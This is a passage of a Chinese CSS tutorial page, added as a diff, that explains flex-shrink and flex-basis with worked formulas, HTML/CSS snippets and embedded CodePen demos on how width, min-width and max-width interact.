+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td><code>40vw</code></td>
+</tr>
+<tr>
+  <td>Flex容器的剩余空间</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td><code>40vw - 60vw = -20vw</code></td>
+</tr>
+<tr>
+  <td><strong>Flex项目新宽度(<code>width</code>)</strong></td>
+  <td><code>?</code></td>
+  <td><code>?</code></td>
+  <td><code>?</code></td>
+  <td><code>?</code></td>
+  <td>&nbsp;</td>
+</tr>
+</tbody>
+</table>
+
+<p>有了这些参数值之后，根据上面提供的<code>flex-shrink</code>计算公式就可以计算 <strong>总收缩宽度</strong> 和 <strong>Flex项目收缩比例</strong>。 我们先来计算出总收缩宽度：</p>
+
+<pre class="undefined"><code class="undefined">» 总收缩宽度 = ∑(Flex项目初始宽度 × Flex项目的flex-shrink值)
+» 总收缩宽度 = (15vw × 0) + (15vw × 1) + (15vw × 2) + (15vw × 3) = 15vw × 6 = 90vw
+</code></pre>
+
+<p>有了总收缩宽度就可以计算出 <strong>Flex项目的收缩比例</strong>：</p>
+
+<pre class="undefined"><code class="undefined">» Flex项目的收缩比例 = (Flex项目的初始宽度 × Flex项目的flex-shrink值) ÷ Flex项目总收缩宽度
+
+» Flex项目1的收缩比例 = (15vw × 0) ÷ 90vw = 0
+» Flex项目2的收缩比例 = (15vw × 1) ÷ 90vw = 0.1667
+» Flex项目3的收缩比例 = (15vw × 2) ÷ 90vw = 0.3333
+» Flex项目4的收缩比例 = (15vw × 3) ÷ 90vw = 0.5
+</code></pre>
+
+<p>这样就可以计算出Flex项目的新宽度：</p>
+
+<pre class="undefined"><code class="undefined">» Flex项目新宽度 = Flex项目初始宽度 - (Flex容器不足空间 × Flex项目收缩比例)
+
+» Flex项目1新宽度 = 15vw - (20vw × 0) = 15vw
+» Flex项目2新宽度 = 15vw - (20vw × 0.1667) = 11.666vw
+» Flex项目3新宽度 = 15vw - (20vw × 0.3333) = 8.334vw
+» Flex项目4新宽度 = 15vw - (20vw × 0.5) = 5vw
+</code></pre>
+
+<p>具体如下图所示：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-66.png" alt=""></p>
+
+<p>其实<code>flex-shrink</code>还有另一套相对来说更为简单的计算公式：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-67.png" alt=""></p>
+
+<p>根据上图的公式，计算出来的结果和前面计算的结果基本相等：</p>
+
+<pre class="undefined"><code class="undefined">» Flex项目的新宽度 = Flex项目初始宽度 - (Flex容器不足空间 ÷ 所有Flex项目flex-shrink和) × Flex项目的flex-shrink
+
+» Flex项目1的新宽度 = 15vw - (20vw ÷ 6) × 0 = 15vw
+» Flex项目2的新宽度 = 15vw - (20vw ÷ 6) × 1 = 11.667vw
+» Flex项目3的新宽度 = 15vw - (20vw ÷ 6) × 2 = 8.333vw
+» Flex项目4的新宽度 = 15vw - (20vw ÷ 6) × 3 = 5vw
+</code></pre>
+
+<p>同样的，<code>flex-shrink</code>也可以取小数值，而且和<code>flex-grow</code>相似，如果所有Flex项目的<code>flex-shrink</code>总和小于<code>1</code>时，Flex容器的不足空间不会全部分完，Flex项目依旧会溢出Flex容器，比如下面这个示例：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-shrink" src="./Flexbox布局：图解CSS(Part2)_files/vYLWVGQ.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/vYLWVGQ'>Flexbox Layout Model: flex-shrink</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>另外，在Flexbox布局当中，会阻止Flex项目宽度缩小至<code>0</code>。如果某个Flex项目按照<code>flex-shrink</code>计算出来的新宽度趋向于<code>0</code>时，Flex项目将会按照该元素的<code>min-content</code>的大小来设置宽度，同时这个宽度将会转嫁到其他Flex项目，再按相应的收缩因子进行收缩。</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-shrink" src="./Flexbox布局：图解CSS(Part2)_files/vYLWVgv.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/vYLWVgv'>Flexbox Layout Model: flex-shrink</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>在这个示例中，第四个Flex项目的<code>flex-shrink</code>的值为<code>9</code>。根据上面提供的公式，可以获知：</p>
+
+<pre class="undefined"><code class="undefined">» Flex项目的新宽度 = Flex项目初始宽度 - (Flex容器不足空间 ÷ 所有Flex项目flex-shrink和) × Flex项目的flex-shrink
+
+» Flex项目4的新宽度 = 15vw - (20vw ÷ 12) × 9 = 0
+</code></pre>
+
+<p>计算出来的宽度为<code>0</code>，但实际上这个时候渲染出来的宽度是该项目的<code>min-content</code>(该示例就是“<strong>shrink</strong>”单词的宽度)，大约<code>47.95px</code>（约<code>3.66vw</code>）。那么这个值将会分成<code>3</code>份（因为该例另外三个Flex项目的<code>flex-shrink</code>是<code>0</code>、<code>1</code>和<code>2</code>），并且对应的Flex项目会继续分配本应Flex项目4要收缩的宽度。即：</p>
+
+<pre class="undefined"><code class="undefined">» Flex项目1新宽度 = 15vw - 20 ÷ 12 × 0 - 3.66 ÷ 3 × 0 = 15vw (约196.5px)
+» Flex项目2新宽度 = 15vw - 20 ÷ 12 × 1 - 3.66 ÷ 3 × 1 = 12.113vw (约158.6847px)
+» Flex项目3新宽度 = 15vw - 20 ÷ 12 × 2 - 3.66 ÷ 3 × 2 = 9.227vw (约120.869px)
+</code></pre>
+
+<p>浏览器视窗宽度在<code>1310px</code>状态下渲染出来的结果如下：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-68.png" alt=""></p>
+
+<p>在Flexbox项目中，虽然<code>flex-shrink</code>会让Flex项目根据收缩因子缩小自身宽度，但是Flex项目自身显式设置了<code>min-width</code>或<code>min-inline-size</code>时，计算出来的值要是小于<code>min-width</code>（或<code>min-inline-size</code>），Flex项目将会按<code>min-width</code>或<code>min-inline-size</code>的值渲染：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-shrink" src="./Flexbox布局：图解CSS(Part2)_files/Rwrjedb.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/Rwrjedb'>Flexbox Layout Model: flex-shrink</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>这个时候，设置了<code>min-width</code>（或<code>min-inline-size</code>）的Flex项目会类似于上例中的<code>min-content</code>一样，将未分配的Flex容器不足空间转嫁到其他的Flex项目上。</p>
+
+<blockquote>
+  <p><strong>相对而言，<code>flex-shrink</code>的计算要比<code>flex-grow</code>复杂一些，特别是当Flex项目根据<code>flex-shrink</code>计算出来的宽度趋于<code>0</code>时，会让计算变得复杂化</strong>。</p>
+</blockquote>
+
+<p>在Flexbox布局模块中，基于前面提到的Flex容器的对齐属性、Flex项目中的<code>flex-shrink</code>和<code>flex-grow</code>我们就可以很好的处理Flex容器的剩余空间和不足空间：</p>
+
+<ul>
+<li>Flex容器有剩余空间（所有Flex项目的宽度总和小于Flex容器的宽度），如果设置了<code>flex-grow</code>，Flex项目会根据扩展因子分配Flex容器剩余空间；在未设置<code>flex-grow</code>时，在Flex容器中是否设置了对齐方式，如果是，那么会按对齐方式分配Flex容器剩余空间，如果不是，Flex容器剩余空间不变</li>
+<li>Flex容器有不足空间（所有Flex项目的宽度总和大于Flex容器的宽度），如果设置了<code>flex-shrink</code>值为<code>0</code>，Flex项目不会收缩，Flex项目溢出Flex容器；如果未显式设置<code>flex-shrink</code>值，Flex项目分平均分配Flex容器不足空间，Flex项目会变窄（Flex项目的<code>flex-shrink</code>的默认值为<code>1</code>），如果显式设置了<code>flex-shrink</code>的值为非<code>0</code>的不同值，那么Flex项目会按照不同的收缩因子分配Flex容器不足空间，Flex项目同样会变窄</li>
+</ul>
+
+<p>具体的我们可以绘制一张这方面的流程图：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-69.png" alt=""></p>
+
+<h4 class="content-title" data-index="4"><code>flex-basis</code></h4>
+
+<p>在Flexbox布局模块中，除了我们熟悉的<code>width</code>、<code>min-width</code>、<code>max-width</code>以及逻辑属性<code>inline-size</code>、<code>min-inline-size</code>和<code>max-inline-size</code>可以用来设置Flex项目的初始宽度之外，还可以使用<code>flex-basis</code>属性，即 <strong>在任何Flex容器空间（剩余空间或不足空间）分配发生之前初始化Flex项目尺寸</strong>。其语法很简单：</p>
+
+<pre class="javascript"><code class="javascript">flex-basis: content | <span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">width</span></span>&gt;</span></span></span><span class="xml">
+</span></span></code></pre>
+
+<p>其默认值为<code>auto</code>。其中<code>content</code>是指Flex项目内容的自动尺寸，而<code>&lt;width&gt;</code>是我们熟悉的带有数值和单位的值，比如<code>10vw</code>、<code>50%</code>、<code>200px</code>等；除此之外，还可以是一些用来描述宽度的关键词，比如<code>fill</code>、<code>max-content</code>、<code>min-content</code>和<code>fit-content()</code>、<code>inherit</code>、<code>initial</code>和<code>unset</code>等。</p>
+
+<p>如果<code>flex-basis</code>的值设置为<code>auto</code>，浏览器将先检查Flex项目的主尺寸是否设置了绝对值，再计算Flex项目的初始值。比如说，你给Flex项目显式设置了<code>width: 200px</code>，那么<code>200px</code>就是Flex项目的<code>flex-basis</code>值。</p>
+
+<p>如果你的Flex项目可以自动调整大小，则<code>auto</code>会解析为其内容的大小，这个时候<code>min-content</code>和<code>max-content</code>会起作用，并且Flex项目的<code>max-content</code>作为<code>flex-basis</code>的值。</p>
+
+<p>相比<code>flex-grow</code>和<code>flex-shrink</code>而言，<code>flex-basis</code>是最复杂的部分。事实上，在Flexbox布局模块中 <strong>设置Flex项目的尺寸大小存在一个隐式的公式</strong>：</p>
+
+<blockquote>
+  <p><strong><code>content</code> ➜ <code>width</code> ➜ <code>flex-basis</code></strong></p>
+</blockquote>
+
+<p>简单地说，<strong>如果Flex项目未显式指定<code>flex-basis</code>的值，那么<code>flex-basis</code>将回退到<code>width</code>（或<code>inline-size</code>）属性；如果未显式指定<code>width</code>（或<code>inline-size</code>）属性的值，那么<code>flex-basis</code>将回退到基于Flex项目内容计算宽度</strong>。不过，决定Flex项目尺寸大小，还受<code>flex-grow</code>和<code>flex-shrink</code>以及Flex容器大小的影响。而且Flex项目 <strong>最终尺寸</strong> 会受<code>min-width</code>、<code>max-width</code>(或<code>min-inline-size</code>、<code>max-inline-size</code>)属性限制。这一点必须得注意。</p>
+
+<p>接下来用一个简单的示例来阐述<code>content</code>、<code>width</code>以及<code>flex-basis</code>对Flex项目尺寸的影响。</p>
+
+<blockquote>
+  <p>其中<code>width</code>是用来描述元素宽度的物理属性，从《<a href="https://www.w3cplus.com/css/css-logical-properties.html" target="_blank">图解CSS：CSS逻辑属性</a>》一文中可以得知，与其相匹配的还有<code>inline-size</code>或<code>block-size</code>逻辑属性。注意，CSS逻辑属性受<code>direction</code>和<code>writing-mode</code>的值的影响。</p>
+</blockquote>
+
+<p>示例代码很简单：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+
+/* CSS */
+
+.flex__container {
+    width: 600px;
+    display: flex;
+
+    border: 1px dashed #f36;
+    align-items: stretch;
+}
+</code></pre>
+
+<p>按照上面的公式节奏来走，慢慢的加戏。</p>
+
+<blockquote>
+  <p><strong>Flex项目不显式的设置任何与尺寸大小有关系属性，即用<code>content</code>来撑开Flex项目</strong>。</p>
+</blockquote>
+
+<p>在上面的HTML基础上添加内容：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span>&gt;</span></span>Lorem ipsum dolor sit amet<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span>&gt;</span></span>Lorem ipsum dolor sit amet consectetur adipisicing elit<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span>&gt;</span></span>Fugiat dolor nihil saepe. Nobis nihil minus similique hic quas mollitia.<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span>&gt;</span></span>Lorem ipsum dolor sit amet consectetur adipisicing elit. Molestias consequuntur sequi suscipit iure fuga ea!<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<p>这个时候你看到的效果如下，而且每个Flex项目的宽度（以<code>width</code>为例）都依赖于元素内容的多少来控制：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-basis: auto" src="./Flexbox布局：图解CSS(Part2)_files/mdVpEqP.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/mdVpEqP'>Flexbox Layout Model: flex-basis: auto</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p><strong>注意，文本相关的CSS属性，比如<code>font-size</code>和<code>font-family</code>等属性此时会影响Flex项目尺寸的大小</strong>。</p>
+
+<p>在这个示例中，并没有显式给Flex项目设置<code>flex-basis</code>属性，此时<code>flex-basis</code>会取默认值<code>auto</code>：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-70.png" alt=""></p>
+
+<p>正如上图所示，浏览器将<code>flex-basis</code>属性的值以<code>auto</code>计算。此时 <strong><code>flex-basis</code>的值会采用Flex项目内容计算出宽度</strong>：</p>
+
+<ul>
+<li>第一个Flex项目计算出来的宽度值为<code>62.61px</code></li>
+<li>第二个Flex项目计算出来的宽度值为<code>126.55px</code></li>
+<li>第三个Flex项目计算出来的宽度值为<code>161.06px</code></li>
+<li>第四个Flex项目计算出来的宽度值为<code>247.78px</code></li>
+</ul>
+
+<p>接下来看第二步：</p>
+
+<blockquote>
+  <p><strong>显式给Flex项目设置<code>width</code>值</strong>。</p>
+</blockquote>
+
+<p>给所有Flex项目设置<code>width: 120px</code>：</p>
+
+<pre class="css"><code class="css"><span class="pseudo"><span class="pseudo">:root</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">120</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.flex__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--width)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-basis: auto &amp; width" src="./Flexbox布局：图解CSS(Part2)_files/YzwYGKp.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/YzwYGKp'>Flexbox Layout Model: flex-basis: auto &amp; width</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>这个时候所有Flex项目宽度都是相等的：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-71.png" alt=""></p>
+
+<p>这个示例中，只是显式给所有Flex项目设置了<code>width: 120px</code>。浏览器计算出来的<code>flex-basis</code>值依旧为<code>auto</code>，但显式的设置了<code>width: 120px</code>，<strong>最终<code>width</code>属性的值决定了Flex项目的尺寸大小</strong>。</p>
+
+<p>继续加码：</p>
+
+<blockquote>
+  <p><strong>显式给Flex项目设置<code>flex-basis</code>值，即Flex项目同时有<code>width</code>和<code>flex-basis</code>值</strong>。</p>
+</blockquote>
+
+<p>为了更好的区分<code>flex-basis</code>和<code>width</code>，在示例中把<code>flex-basis</code>和<code>width</code>设置不同的值：</p>
+
+<pre class="css"><code class="css"><span class="pseudo"><span class="pseudo">:root</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">120</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--flexBasis</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">150</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.flex__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">800</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.flex__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--width)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-basis</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--flexBasis)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-basis &amp; width" src="./Flexbox布局：图解CSS(Part2)_files/ExPogZj.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/ExPogZj'>Flexbox Layout Model: flex-basis &amp; width</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>在这个示例中，虽然在Flex项目同时显式设置了<code>width</code>和<code>flex-basis</code>，但Flex项目最终的尺寸大小采用了<code>flex-basis</code>的值：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-72.png" alt=""></p>
+
+<p>也就是说，<strong>同时显式给Flex项目设置<code>flex-basis</code>和<code>width</code>的值，则<code>width</code>会被忽略，不再起作用，相当于没有设置</strong>。</p>
+
+<p>在该示例中，所有Flex项目宽度的总和是 <strong><code>600px</code></strong>，小于Flex容器宽度 <strong><code>800px</code></strong>，Flex容器的剩余宽度为<code>200px</code>:</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-73.png" alt=""></p>
+
+<p>如果所有Flex项目宽度的总和大于Flex容器宽度会怎么样呢？我想你可能知道结果了，但这里还是花点时间再向大家印证一下。我们在上例的基础上将Flex项目的<code>flex-basis</code>值调整为<code>300px</code>：</p>
+
+<pre class="css"><code class="css"><span class="pseudo"><span class="pseudo">:root</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">120</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--flexBasis</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">300</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-basis &amp; width" src="./Flexbox布局：图解CSS(Part2)_files/KKVZgxO.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/KKVZgxO'>Flexbox Layout Model: flex-basis &amp; width</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>当你没看到上面的渲染效果时，你是否会认为，Flex项目应该是取值<code>flex-basis</code>，即<code>300px</code>。Flex项目会溢出Flex容器：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-74.png" alt=""></p>
+
+<p>如果你真的是这么的认为，那说明你没有仔细阅读前面有关于<code>flex-shrink</code>的内容。事实上，Flex项目的宽度并不是<code>width</code>的值<code>150px</code>，也不是<code>flex-basis</code>的值<code>300px</code>，而是一个被重新计算后的值 <strong><code>199.5px</code></strong>：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-75.png" alt=""></p>
+
+<p>这就是Flexbox布局模块的强大之处，会有这样的结果都归功于<code>flex-shrink</code>属性。从前面的内容我们可以得知，当Flex容器有不足空间（该示例为<code>200px</code>），并且未显式设置<code>flex-shrink</code>属性，那么浏览器将会取其默认值<code>1</code>作为收缩因子，并且根据<code>flex-shrink</code>计算公式计算出每一个Flex项目应该在原有宽度<code>300px</code>上减去多少应该收缩的宽度：</p>
+
+<pre class="undefined"><code class="undefined">» Flex项目的新宽度 = Flex项目初始宽度 - (Flex容器不足空间 ÷ 所有Flex项目flex-shrink和) × Flex项目的flex-shrink
+
+» Flex项目的新宽度 = 300px - (402px ÷ 4) × 1 = 199.5px
+</code></pre>
+
+<blockquote>
+  <p>注意，在该示例中，Flex容器设置了<code>1px</code>的边框，计算出来Flex容器不足的空间为<code>402px</code>。</p>
+</blockquote>
+
+<p>前面提到过，在Flexbox布局模块中影响Flex项目尺寸大小应该根据其隐式公式(即 <strong><code>content</code> ➜ <code>width</code> ➜ <code>flex-basis</code></strong> ）来进行判断。如果要显式给Flex项目设置尺寸大小，其最佳方式是 <strong>使用<code>flex-basis</code>，而不是<code>width</code>(或<code>inline-size</code>)</strong>。</p>
+
+<p>最后还有一点千万别忘记：</p>
+
+<blockquote>
+  <p><strong>使用<code>flex-basis</code>时会受<code>min-width</code>和<code>max-width</code>（或逻辑属性中<code>min-inline-size</code>或<code>max-inline-size</code>）的限制</strong>。</p>
+</blockquote>
+
+<p>在详细阐述这一点之前，我们先来回忆一下。</p>
+
+<p>在CSS中除了通过<code>width</code>(或<code>height</code>)显式给一个盒子定义尺寸之外，还可以通过<code>min-width</code>（或<code>min-height</code>）和<code>max-width</code>（或<code>max-height</code>）来定义盒子尺寸。如果拿<code>width</code>、<code>min-width</code>和<code>max-width</code>同时给一个盒子设置宽度时，具体取值为哪个？这是一个很有意思的问题。我们可以通过这三者之间的权重来取决：</p>
+
+<ul>
+<li>元素的<code>width</code>大于<code>max-width</code>时，元素的<code>width</code>等于<code>max-width</code>，即 <strong><code>max-width</code>能覆盖<code>width</code></strong></li>
+<li>元素的<code>width</code>小于<code>min-width</code>时，元素的<code>width</code>等于<code>min-width</code>，即 <strong><code>min-width</code>能覆盖<code>width</code></strong></li>
+<li>当<code>min-width</code>大于<code>max-width</code>时，<strong><code>min-width</code>优先级将高于<code>max-width</code></strong></li>
+</ul>
+
+<p>这个规则同样适用于<code>inline-size</code>、<code>min-inline-size</code>和<code>max-inline-size</code>。</p>
+
+<p>同样的，当<code>flex-basis</code>、<code>min-width</code>和<code>max-width</code>同时出现时，也可以套用上面的规则，最终客户端会决定哪个值运用于Flex项目上。这就是为什么说 <strong><code>flex-basis</code>会受制于<code>min-width</code>和<code>max-width</code></strong>。 事实上，我们在介绍<code>flex-grow</code>和<code>flex-shrink</code>时也提到过，当<code>flex-grow</code>计算出来的值大于<code>max-width</code>值时，会取<code>max-width</code>的值；当<code>flex-shrink</code>计算出来的值小于<code>min-width</code>值时，会取<code>min-width</code>值。</p>
+
+<p>如果Flex项目同时出现<code>width</code>、<code>flex-basis</code>和<code>min-width</code>时，具体的运算过程如下：</p>
+
+<ul>
+<li>根据法则： <strong><code>content</code> ➜ <code>width</code> ➜ <code>flex-basis</code></strong>，判断出运用于Flex项目的值，即<code>flex-basis</code>会运用于Flex项目</li>
+<li>再根据法则：<strong>Flex项目的 <code>width</code> 小于 <code>min-width</code>时，Flex项目的 <code>width</code> 等于 <code>min-width</code>，即 <code>min-width</code>能覆盖<code>width</code></strong></li>
+</ul>
+
+<p>这样一来，<strong>如果<code>flex-basis</code>小于<code>min-width</code>时，Flex项目的宽度会取值<code>min-width</code>，即<code>min-width</code>覆盖<code>flex-basis</code></strong>。</p>
+
+<p>如果Flex项目同时出现<code>width</code>、<code>flex-basis</code>和<code>max-width</code>时，具体的运算过程如下：</p>
+
+<ul>
+<li>根据法则： <strong><code>content</code> ➜ <code>width</code> ➜ <code>flex-basis</code></strong>，判断出运用于Flex项目的值，即<code>flex-basis</code>会运用于Flex项目</li>
+<li>再根据法则：<strong>Flex项目的 <code>width</code> 大于 <code>max-width</code>时，Flex项目的 <code>width</code> 等于 <code>max-width</code>，即 <code>max-width</code>能覆盖<code>width</code></strong></li>
+</ul>
+
+<p>这样一来，<strong>如果<code>flex-basis</code>大于<code>max-width</code>时，Flex项目的宽度会取值<code>max-width</code>，即<code>max-width</code>覆盖<code>flex-basis</code></strong>。</p>
+
+<p>如果Flex项目同时出现<code>width</code>、<code>flex-basis</code>、<code>min-width</code>和<code>max-width</code>时，会在上面的规则上增加新的一条规则来进行判断：</p>
+
+<blockquote>
+  <p>当 <code>min-width</code> 大于 <code>max-width</code> 时，<strong><code>min-width</code>优先级将高于<code>max-width</code></strong>。</p>
+</blockquote>
+
+<p>那么套用到Flex项目中：</p>
+
+<ul>
+<li><code>flex-basis</code>大于<code>max-width</code>，Flex项目的宽度等于<code>max-width</code>，即 <strong><code>max-width</code>能覆盖<code>flex-basis</code></strong></li>
+<li><code>flex-basis</code>小于<code>min-width</code>时，Flex项目的宽度会取值<code>min-width</code>，即 <strong><code>min-width</code>覆盖<code>flex-basis</code></strong></li>
+</ul>
+
